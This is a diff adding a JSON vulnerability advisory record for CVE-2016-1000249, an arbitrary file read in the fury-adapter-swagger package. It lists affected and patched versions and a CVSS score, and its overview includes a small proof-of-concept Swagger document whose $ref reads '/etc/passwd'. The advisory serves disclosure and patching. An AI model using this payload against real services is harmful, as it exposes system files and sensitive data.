@@ -1,0 +1,21 @@
+{
+  "id": 305,
+  "created_at": "2017-01-17T17:06:31+00:00",
+  "updated_at": "2017-01-23T16:45:16+00:00",
+  "title": "Arbitrary File Read",
+  "author": "Honza Javorek",
+  "module_name": "fury-adapter-swagger",
+  "publish_date": "2017-01-23T16:45:16+00:00",
+  "cves": [
+    "CVE-2016-1000249"
+  ],
+  "vulnerable_versions": ">= 0.2.0 <= 0.9.6 || ~0.8.0-pre",
+  "patched_versions": "> 0.9.6",
+  "slug": "fury-adapter-swagger_arbitrary-file-read",
+  "overview": "fury-adapter-swagger is a fury.js adapter for loading swagger HTTP API description documents - either via YAML or JSON.\n\nfury-adapter-swagger has a vulnerability that allows arbitrary file reads off the file system.  This could be used to retrieve sensitive data, or cause a denial of service by reading `/dev/zero`.  An example proof of concept is provided below:\n\n```\n---\nswagger: '2.0'\ninfo:\n  title: Read local files\n  version: '1.0'\n\npaths:\n  /foo:\n    get:\n      responses:\n        200:\n          description: Some description\n          examples:\n            text/html:\n              example:\n                $ref: '/etc/passwd'\n```",
+  "recommendation": "Upgrade to version 0.9.7 or later",
+  "references": "* https://github.com/distributedweaknessfiling/DWF-Database-Artifacts/blob/master/DWF/2016/1000249/CVE-2016-1000249.json",
+  "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
+  "cvss_score": 9.1,
+  "coordinating_vendor": "^Lift Security"
+}
